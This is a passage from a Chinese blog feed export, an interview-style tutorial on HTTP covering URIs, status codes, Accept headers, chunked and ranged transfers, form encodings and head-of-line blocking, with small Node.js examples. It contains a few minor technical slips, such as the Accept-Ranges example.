href="#003-如何理解-URI？" class="headerlink" title="003: 如何理解 URI？"></a>003: 如何理解 URI？</h2><p><strong>URI</strong>, 全称为(Uniform Resource Identifier), 也就是<strong>统一资源标识符</strong>，它的作用很简单，就是区分互联网上不同的资源。</p><p>但是，它并不是我们常说的<code>网址</code>, 网址指的是<code>URL</code>, 实际上<code>URI</code>包含了<code>URN</code>和<code>URL</code>两个部分，由于 URL 过于普及，就默认将 URI 视为 URL 了。</p><h3 id="URI-的结构"><a href="#URI-的结构" class="headerlink" title="URI 的结构"></a>URI 的结构</h3><p>URI 真正最完整的结构是这样的。</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd677629b70d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>可能你会有疑问，好像跟平时见到的不太一样啊！先别急，我们来一一拆解。</p><p><strong>scheme</strong> 表示协议名，比如<code>http</code>, <code>https</code>, <code>file</code>等等。后面必须和<code>://</code>连在一起。</p><p><strong>user:passwd</strong>@ 表示登录主机时的用户信息，不过很不安全，不推荐使用，也不常用。</p><p><strong>host:port</strong>表示主机名和端口。</p><p><strong>path</strong>表示请求路径，标记资源所在位置。</p><p><strong>query</strong>表示查询参数，为<code>key=val</code>这种形式，多个键值对之间用<code>&amp;</code>隔开。</p><p><strong>fragment</strong>表示 URI 所定位的资源内的一个<strong>锚点</strong>，浏览器可以根据这个锚点跳转到对应的位置。</p><p>举个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;HTTP&amp;rsv_spt&#x3D;1</span><br></pre></td></tr></table></figure><p>这个 URI 中，<code>https</code>即<code>scheme</code>部分，<code>www.baidu.com</code>为<code>host:port</code>部分（注意，http 和 https 的默认端口分别为80、443），<code>/s</code>为<code>path</code>部分，而<code>wd=HTTP&amp;rsv_spt=1</code>就是<code>query</code>部分。</p><h3 id="URI-编码"><a href="#URI-编码" class="headerlink" title="URI 编码"></a>URI 编码</h3><p>URI 只能使用<code>ASCII</code>, ASCII 之外的字符是不支持显示的，而且还有一部分符号是界定符，如果不加以处理就会导致解析出错。</p><p>因此，URI 引入了<code>编码</code>机制，将所有<strong>非 ASCII 码字符</strong>和<strong>界定符</strong>转为十六进制字节值，然后在前面加个<code>%</code>。</p><p>如，空格被转义成了<code>%20</code>，<strong>三元</strong>被转义成了<code>%E4%B8%89%E5%85%83</code>。</p><h2 id="004-如何理解-HTTP-状态码？"><a href="#004-如何理解-HTTP-状态码？" class="headerlink" title="004: 如何理解 HTTP 状态码？"></a>004: 如何理解 HTTP 状态码？</h2><p>RFC 规定 HTTP 的状态码为<strong>三位数</strong>，被分为五类:</p><ul><li><strong>1xx</strong>: 表示目前是协议处理的中间状态，还需要后续操作。</li><li><strong>2xx</strong>: 表示成功状态。</li><li><strong>3xx</strong>: 重定向状态，资源位置发生变动，需要重新请求。</li><li><strong>4xx</strong>: 请求报文有误。</li><li><strong>5xx</strong>: 服务器端发生错误。</li></ul><p>接下来就一一分析这里面具体的状态码。</p><h3 id="1xx"><a href="#1xx" class="headerlink" title="1xx"></a>1xx</h3><p><strong>101 Switching Protocols</strong>。在<code>HTTP</code>升级为<code>WebSocket</code>的时候，如果服务器同意变更，就会发送状态码 101。</p><h3 id="2xx"><a href="#2xx" class="headerlink" title="2xx"></a>2xx</h3><p><strong>200 OK</strong>是见得最多的成功状态码。通常在响应体中放有数据。</p><p><strong>204 No Content</strong>含义与 200 相同，但响应头后没有 body 数据。</p><p><strong>206 Partial Content</strong>顾名思义，表示部分内容，它的使用场景为 HTTP 分块下载和断点续传，当然也会带上相应的响应头字段<code>Content-Range</code>。</p><h3 id="3xx"><a href="#3xx" class="headerlink" title="3xx"></a>3xx</h3><p><strong>301 Moved Permanently</strong>即永久重定向，对应着<strong>302 Found</strong>，即临时重定向。</p><p>比如你的网站从 HTTP 升级到了 HTTPS 了，以前的站点再也不用了，应当返回<code>301</code>，这个时候浏览器默认会做缓存优化，在第二次访问的时候自动访问重定向的那个地址。</p><p>而如果只是暂时不可用，那么直接返回<code>302</code>即可，和<code>301</code>不同的是，浏览器并不会做缓存优化。</p><p><strong>304 Not Modified</strong>: 当协商缓存命中时会返回这个状态码。详见<a href="https://link.juejin.cn/?target=http://47.98.159.95/my_blog/perform/001.html">浏览器缓存</a></p><h3 id="4xx"><a href="#4xx" class="headerlink" title="4xx"></a>4xx</h3><p><strong>400 Bad Request</strong>: 开发者经常看到一头雾水，只是笼统地提示了一下错误，并不知道哪里出错了。</p><p><strong>403 Forbidden</strong>: 这实际上并不是请求报文出错，而是服务器禁止访问，原因有很多，比如法律禁止、信息敏感。</p><p><strong>404 Not Found</strong>: 资源未找到，表示没在服务器上找到相应的资源。</p><p><strong>405 Method Not Allowed</strong>: 请求方法不被服务器端允许。</p><p><strong>406 Not Acceptable</strong>: 资源无法满足客户端的条件。</p><p><strong>408 Request Timeout</strong>: 服务器等待了太长时间。</p><p><strong>409 Conflict</strong>: 多个请求发生了冲突。</p><p><strong>413 Request Entity Too Large</strong>: 请求体的数据过大。</p><p><strong>414 Request-URI Too Long</strong>: 请求行里的 URI 太大。</p><p><strong>429 Too Many Request</strong>: 客户端发送的请求过多。</p><p><strong>431 Request Header Fields Too Large</strong>请求头的字段内容太大。</p><h3 id="5xx"><a href="#5xx" class="headerlink" title="5xx"></a>5xx</h3><p><strong>500 Internal Server Error</strong>: 仅仅告诉你服务器出错了，出了啥错咱也不知道。</p><p><strong>501 Not Implemented</strong>: 表示客户端请求的功能还不支持。</p><p><strong>502 Bad Gateway</strong>: 服务器自身是正常的，但访问的时候出错了，啥错误咱也不知道。</p><p><strong>503 Service Unavailable</strong>: 表示服务器当前很忙，暂时无法响应服务。</p><h2 id="005-简要概括一下-HTTP-的特点？HTTP-有哪些缺点？"><a href="#005-简要概括一下-HTTP-的特点？HTTP-有哪些缺点？" class="headerlink" title="005: 简要概括一下 HTTP 的特点？HTTP 有哪些缺点？"></a>005: 简要概括一下 HTTP 的特点？HTTP 有哪些缺点？</h2><h3 id="HTTP-特点"><a href="#HTTP-特点" class="headerlink" title="HTTP 特点"></a>HTTP 特点</h3><p>HTTP 的特点概括如下:</p><ol><li>灵活可扩展，主要体现在两个方面。一个是语义上的自由，只规定了基本格式，比如空格分隔单词，换行分隔字段，其他的各个部分都没有严格的语法限制。另一个是传输形式的多样性，不仅仅可以传输文本，还能传输图片、视频等任意数据，非常方便。</li><li>可靠传输。HTTP 基于 TCP/IP，因此把这一特性继承了下来。这属于 TCP 的特性，不具体介绍了。</li><li>请求-应答。也就是<code>一发一收</code>、<code>有来有回</code>， 当然这个请求方和应答方不单单指客户端和服务器之间，如果某台服务器作为代理来连接后端的服务端，那么这台服务器也会扮演<strong>请求方</strong>的角色。</li><li>无状态。这里的状态是指<strong>通信过程的上下文信息</strong>，而每次 http 请求都是独立、无关的，默认不需要保留状态信息。</li></ol><h3 id="HTTP-缺点"><a href="#HTTP-缺点" class="headerlink" title="HTTP 缺点"></a>HTTP 缺点</h3><h4 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h4><p>所谓的优点和缺点还是要分场景来看的，对于 HTTP 而言，最具争议的地方在于它的<strong>无状态</strong>。</p><p>在需要长连接的场景中，需要保存大量的上下文信息，以免传输大量重复的信息，那么这时候无状态就是 http 的缺点了。</p><p>但与此同时，另外一些应用仅仅只是为了获取一些数据，不需要保存连接上下文信息，无状态反而减少了网络开销，成为了 http 的优点。</p><h4 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h4><p>即协议里的报文(主要指的是头部)不使用二进制数据，而是文本形式。</p><p>这当然对于调试提供了便利，但同时也让 HTTP 的报文信息暴露给了外界，给攻击者也提供了便利。<code>WIFI陷阱</code>就是利用 HTTP 明文传输的缺点，诱导你连上热点，然后疯狂抓你所有的流量，从而拿到你的敏感信息。</p><h4 id="队头阻塞问题"><a href="#队头阻塞问题" class="headerlink" title="队头阻塞问题"></a>队头阻塞问题</h4><p>当 http 开启长连接时，共用一个 TCP 连接，同一时刻只能处理一个请求，那么当前请求耗时过长的情况下，其它的请求只能处于阻塞状态，也就是著名的<strong>队头阻塞</strong>问题。接下来会有一小节讨论这个问题。</p><h2 id="006-对-Accept-系列字段了解多少？"><a href="#006-对-Accept-系列字段了解多少？" class="headerlink" title="006: 对 Accept 系列字段了解多少？"></a>006: 对 Accept 系列字段了解多少？</h2><p>对于<code>Accept</code>系列字段的介绍分为四个部分: <strong>数据格式</strong>、<strong>压缩方式</strong>、<strong>支持语言</strong>和<strong>字符集</strong>。</p><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>上一节谈到 HTTP 灵活的特性，它支持非常多的数据格式，那么这么多格式的数据一起到达客户端，客户端怎么知道它的格式呢？</p><p>当然，最低效的方式是直接猜，有没有更好的方式呢？直接指定可以吗？</p><p>答案是肯定的。不过首先需要介绍一个标准——<strong>MIME</strong>(Multipurpose Internet Mail Extensions, <strong>多用途互联网邮件扩展</strong>)。它首先用在电子邮件系统中，让邮件可以发任意类型的数据，这对于 HTTP 来说也是通用的。</p><p>因此，HTTP 从<strong>MIME type</strong>取了一部分来标记报文 body 部分的数据类型，这些类型体现在<code>Content-Type</code>这个字段，当然这是针对于发送端而言，接收端想要收到特定类型的数据，也可以用<code>Accept</code>字段。</p><p>具体而言，这两个字段的取值可以分为下面几类:</p><ul><li>text： text/html, text/plain, text/css 等</li><li>image: image/gif, image/jpeg, image/png 等</li><li>audio/video: audio/mpeg, video/mp4 等</li><li>application: application/json, application/javascript, application/pdf, application/octet-stream</li></ul><h3 id="压缩方式"><a href="#压缩方式" class="headerlink" title="压缩方式"></a>压缩方式</h3><p>当然一般这些数据都是会进行编码压缩的，采取什么样的压缩方式就体现在了发送方的<code>Content-Encoding</code>字段上， 同样的，接收什么样的压缩方式体现在了接受方的<code>Accept-Encoding</code>字段上。这个字段的取值有下面几种：</p><ul><li>gzip: 当今最流行的压缩格式</li><li>deflate: 另外一种著名的压缩格式</li><li>br: 一种专门为 HTTP 发明的压缩算法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><h3 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h3><p>对于发送方而言，还有一个<code>Content-Language</code>字段，在需要实现国际化的方案当中，可以用来指定支持的语言，在接受方对应的字段为<code>Accept-Language</code>。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Language: zh-CN, zh, en</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Language: zh-CN, zh, en</span><br></pre></td></tr></table></figure><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>最后是一个比较特殊的字段, 在接收端对应为<code>Accept-Charset</code>，指定可以接受的字符集，而在发送端并没有对应的<code>Content-Charset</code>, 而是直接放在了<code>Content-Type</code>中，以<strong>charset</strong>属性指定。如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Charset: charset&#x3D;utf-8</span><br></pre></td></tr></table></figure><p>最后以一张图来总结一下吧:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6bb6d09c2d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><h2 id="007-对于定长和不定长的数据，HTTP-是怎么传输的？"><a href="#007-对于定长和不定长的数据，HTTP-是怎么传输的？" class="headerlink" title="007: 对于定长和不定长的数据，HTTP 是怎么传输的？"></a>007: 对于定长和不定长的数据，HTTP 是怎么传输的？</h2><h3 id="定长包体"><a href="#定长包体" class="headerlink" title="定长包体"></a>定长包体</h3><p>对于定长包体而言，发送端在传输的时候一般会带上 <code>Content-Length</code>, 来指明包体的长度。</p><p>我们用一个<code>nodejs</code>服务器来模拟一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">const server &#x3D; http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(&#39;request&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  if(req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">    res.setHeader(&#39;Content-Type&#39;, &#39;text&#x2F;plain&#39;);</span><br><span class="line">    res.setHeader(&#39;Content-Length&#39;, 10);</span><br><span class="line">    res.write(&quot;helloworld&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8081, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&quot;成功启动&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>启动后访问: <strong>localhost:8081</strong>。</p><p>浏览器中显示如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>这是长度正确的情况，那不正确的情况是如何处理的呢？</p><p>我们试着把这个长度设置的小一些:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(&#39;Content-Length&#39;, 8);</span><br></pre></td></tr></table></figure><p>重启服务，再次访问，现在浏览器中内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hellowo</span><br></pre></td></tr></table></figure><p>那后面的<code>ld</code>哪里去了呢？实际上在 http 的响应体中直接被截去了。</p><p>然后我们试着将这个长度设置得大一些:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(&#39;Content-Length&#39;, 12);</span><br></pre></td></tr></table></figure><p>此时浏览器显示如下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6f598bea62~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>直接无法显示了。可以看到<code>Content-Length</code>对于 http 传输过程起到了十分关键的作用，如果设置不当可以直接导致传输失败。</p><h3 id="不定长包体"><a href="#不定长包体" class="headerlink" title="不定长包体"></a>不定长包体</h3><p>上述是针对于<code>定长包体</code>，那么对于<code>不定长包体</code>而言是如何传输的呢？</p><p>这里就必须介绍另外一个 http 头部字段了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><p>表示分块传输数据，设置这个字段后会自动产生两个效果:</p><ul><li>Content-Length 字段会被忽略</li><li>基于长连接持续推送动态内容</li></ul><p>我们依然以一个实际的例子来模拟分块传输，nodejs 程序如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">const server &#x3D; http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(&#39;request&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  if(req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">    res.setHeader(&#39;Content-Type&#39;, &#39;text&#x2F;html; charset&#x3D;utf8&#39;);</span><br><span class="line">    res.setHeader(&#39;Content-Length&#39;, 10);</span><br><span class="line">    res.setHeader(&#39;Transfer-Encoding&#39;, &#39;chunked&#39;);</span><br><span class="line">    res.write(&quot;&lt;p&gt;来啦&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      res.write(&quot;第一次传输&lt;br&#x2F;&gt;&quot;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      res.write(&quot;第二次传输&quot;);</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8009, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&quot;成功启动&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问效果入下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd728ba3840d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>用 telnet 抓到的响应如下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd78332368a0~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>注意，<code>Connection: keep-alive</code>及之前的为响应行和响应头，后面的内容为响应体，这两部分用换行符隔开。</p><p>响应体的结构比较有意思，如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk长度(16进制的数)</span><br><span class="line">第一个chunk的内容</span><br><span class="line">chunk长度(16进制的数)</span><br><span class="line">第二个chunk的内容</span><br><span class="line">......</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后是留有有一个<code>空行</code>的，这一点请大家注意。</p><p>以上便是 http 对于<strong>定长数据</strong>和<strong>不定长数据</strong>的传输方式。</p><h2 id="008-HTTP-如何处理大文件的传输？"><a href="#008-HTTP-如何处理大文件的传输？" class="headerlink" title="008: HTTP 如何处理大文件的传输？"></a>008: HTTP 如何处理大文件的传输？</h2><p>对于几百 M 甚至上 G 的大文件来说，如果要一口气全部传输过来显然是不现实的，会有大量的等待时间，严重影响用户体验。因此，HTTP 针对这一场景，采取了<code>范围请求</code>的解决方案，允许客户端仅仅请求一个资源的一部分。</p><h3 id="如何支持"><a href="#如何支持" class="headerlink" title="如何支持"></a>如何支持</h3><p>当然，前提是服务器要支持<strong>范围请求</strong>，要支持这个功能，就必须加上这样一个响应头:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Ranges: none</span><br></pre></td></tr></table></figure><p>用来告知客户端这边是支持范围请求的。</p><h3 id="Range-字段拆解"><a href="#Range-字段拆解" class="headerlink" title="Range 字段拆解"></a>Range 字段拆解</h3><p>而对于客户端而言，它需要指定请求哪一部分，通过<code>Range</code>这个请求头字段确定，格式为<code>bytes=x-y</code>。接下来就来讨论一下这个 Range 的书写格式:</p><ul><li><strong>0-499</strong>表示从开始到第 499 个字节。</li><li><strong>500</strong>- 表示从第 500 字节到文件终点。</li><li><strong>-100</strong>表示文件的最后100个字节。</li></ul><p>服务器收到请求之后，首先验证范围<strong>是否合法</strong>，如果越界了那么返回<code>416</code>错误码，否则读取相应片段，返回<code>206</code>状态码。</p><p>同时，服务器需要添加<code>Content-Range</code>字段，这个字段的格式根据请求头中<code>Range</code>字段的不同而有所差异。</p><p>具体来说，请求<code>单段数据</code>和请求<code>多段数据</code>，响应头是不一样的。</p><p>举个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 单段数据</span><br><span class="line">Range: bytes&#x3D;0-9</span><br><span class="line">&#x2F;&#x2F; 多段数据</span><br><span class="line">Range: bytes&#x3D;0-9, 30-39</span><br></pre></td></tr></table></figure><p>接下来我们就分别来讨论着两种情况。</p><h3 id="单段数据"><a href="#单段数据" class="headerlink" title="单段数据"></a>单段数据</h3><p>对于<code>单段数据</code>的请求，返回的响应如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Content-Length: 10</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Range: bytes 0-9&#x2F;100</span><br><span class="line"></span><br><span class="line">i am xxxxx</span><br></pre></td></tr></table></figure><p>值得注意的是<code>Content-Range</code>字段，<code>0-9</code>表示请求的返回，<code>100</code>表示资源的总大小，很好理解。</p><h3 id="多段数据"><a href="#多段数据" class="headerlink" title="多段数据"></a>多段数据</h3><p>接下来我们看看多段请求的情况。得到的响应会是下面这个形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Content-Type: multipart&#x2F;byteranges; boundary&#x3D;00000010101</span><br><span class="line">Content-Length: 189</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--00000010101</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Range: bytes 0-9&#x2F;96</span><br><span class="line"></span><br><span class="line">i am xxxxx</span><br><span class="line">--00000010101</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Range: bytes 20-29&#x2F;96</span><br><span class="line"></span><br><span class="line">eex jspy e</span><br><span class="line">--00000010101--</span><br></pre></td></tr></table></figure><p>这个时候出现了一个非常关键的字段<code>Content-Type: multipart/byteranges;boundary=00000010101</code>，它代表了信息量是这样的:</p><ul><li>请求一定是多段数据请求</li><li>响应体中的分隔符是 00000010101</li></ul><p>因此，在响应体中各段数据之间会由这里指定的分隔符分开，而且在最后的分隔末尾添上<code>--</code>表示结束。</p><p>以上就是 http 针对大文件传输所采用的手段。</p><h2 id="009-HTTP-中如何处理表单数据的提交？"><a href="#009-HTTP-中如何处理表单数据的提交？" class="headerlink" title="009: HTTP 中如何处理表单数据的提交？"></a>009: HTTP 中如何处理表单数据的提交？</h2><p>在 http 中，有两种主要的表单提交的方式，体现在两种不同的<code>Content-Type</code>取值:</p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li></ul><p>由于表单提交一般是<code>POST</code>请求，很少考虑<code>GET</code>，因此这里我们将默认提交的数据放在请求体中。</p><h3 id="application-x-www-form-urlencoded"><a href="#application-x-www-form-urlencoded" class="headerlink" title="application/x-www-form-urlencoded"></a>application/x-www-form-urlencoded</h3><p>对于<code>application/x-www-form-urlencoded</code>格式的表单内容，有以下特点:</p><ul><li>其中的数据会被编码成以<code>&amp;</code>分隔的键值对</li><li>字符以<strong>URL编码方式</strong>编码。</li></ul><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 转换过程: &#123;a: 1, b: 2&#125; -&gt; a&#x3D;1&amp;b&#x3D;2 -&gt; 如下(最终形式)</span><br><span class="line">&quot;a%3D1%26b%3D2&quot;</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><p>对于<code>multipart/form-data</code>而言:</p><ul><li>请求头中的<code>Content-Type</code>字段会包含<code>boundary</code>，且<code>boundary</code>的值有浏览器默认指定。例: <code>Content-Type: multipart/form-data;boundary=----WebkitFormBoundaryRRJKeWfHPGrS4LKe</code>。</li><li>数据会分为多个部分，每两个部分之间通过分隔符来分隔，每部分表述均有 HTTP 头部描述子包体，如<code>Content-Type</code>，在最后的分隔符会加上<code>--</code>表示结束。</li></ul><p>相应的<code>请求体</code>是下面这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name&#x3D;&quot;data1&quot;;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">data1</span><br><span class="line">----WebkitFormBoundaryRRJKeWfHPGrS4LKe</span><br><span class="line">Content-Disposition: form-data;name&#x3D;&quot;data2&quot;;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">data2</span><br><span class="line">----WebkitFormBoundaryRRJKeWfHPGrS4LKe--</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>值得一提的是，<code>multipart/form-data</code> 格式最大的特点在于:<strong>每一个表单元素都是独立的资源表述</strong>。另外，你可能在写业务的过程中，并没有注意到其中还有<code>boundary</code>的存在，如果你打开抓包工具，确实可以看到不同的表单元素被拆分开了，之所以在平时感觉不到，是以为浏览器和 HTTP 给你封装了这一系列操作。</p><p>而且，在实际的场景中，对于图片等文件的上传，基本采用<code>multipart/form-data</code>而不用<code>application/x-www-form-urlencoded</code>，因为没有必要做 URL 编码，带来巨大耗时的同时也占用了更多的空间。</p><h2 id="010-HTTP1-1-如何解决-HTTP-的队头阻塞问题？"><a href="#010-HTTP1-1-如何解决-HTTP-的队头阻塞问题？" class="headerlink" title="010: HTTP1.1 如何解决 HTTP 的队头阻塞问题？"></a>010: HTTP1.1 如何解决 HTTP 的队头阻塞问题？</h2><h3 id="什么是-HTTP-队头阻塞？"><a href="#什么是-HTTP-队头阻塞？" class="headerlink" title="什么是 HTTP 队头阻塞？"></a>什么是 HTTP 队头阻塞？</h3><p>从前面的小节可以知道，HTTP 传输是基于<code>请求-应答</code>的模式进行的，报文必须是一发一收，但值得注意的是，里面的任务被放在一个任务队列中串行执行，一旦队首的请求处理太慢，就会阻塞后面请求的处理。这就是著名的<code>HTTP队头阻塞</code>问题。</p><h3 id="并发连接"><a href="#并发连接" class="headerlink" title="并发连接"></a>并发连接</h3><p>对于一个域名允许分配多个长连接，那么相当于增加了任务队列，不至于一个队伍的任务阻塞其它所有任务。在RFC2616规定过客户端最多并发 2 个连接，不过事实上在现在的浏览器标准中，这个上限要多很多，Chrome 中是 6 个。</p><p>但其实，即使是提高了并发连接，还是不能满足人们对性能的需求。</p><h3 id="域名分片"><a href="#域名分片" class="headerlink" title="域名分片"></a>域名分片</h3><p>一个域名不是可以并发 6 个长连接吗？那我就多分几个域名。</p><p>比如 content1.sanyuan.com 、content2.sanyuan.com。</p><p>这样一个<code>sanyuan.com</code>域名下可以分出非常多的二级域名，而它们都指向同样的一台服务器，能够并发的长连接数更多了，事实上也更好地解决了队头阻塞的问题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>web中的几种“握手”</title>
    <link href="http://aiolimp.com/2021/08/10/web%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E6%8F%A1%E6%89%8B%E2%80%9D/"/>
    <id>http://aiolimp.com/2021/08/10/web%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E6%8F%A1%E6%89%8B%E2%80%9D/</id>
    <published>2021-08-10T08:57:49.000Z</published>
